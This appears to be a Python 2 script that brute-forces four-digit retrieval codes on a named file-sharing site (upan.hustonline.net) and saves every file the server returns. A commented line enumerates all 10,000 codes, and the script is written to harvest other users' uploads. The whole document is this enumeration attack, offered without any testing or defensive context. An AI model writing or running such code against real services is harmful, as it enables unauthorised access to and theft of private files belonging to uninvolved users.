#!/usr/bin/env python

import requests
import itertools

# total: 10000
#codes=[''.join(i) for i in itertools.product('0123456789',repeat=4)]
# total:
codes=[]
url='http://upan.hustonline.net/'

for code in codes:
    payload={'code':code}
    r=requests.post(url,data=payload)

    if r.content!='None':
        filename=r.headers['content-disposition'].split('filename=')[1]
        filename=requests.compat.unquote(filename)

        # save file
        print 'Code:',code,'File:',filename
        f=open('upan/'+filename,'wb')
        f.write(r.content)
        f.close()
    else:
        print 'Code:',code,'File: None'

print '='*20
print 'Finished'
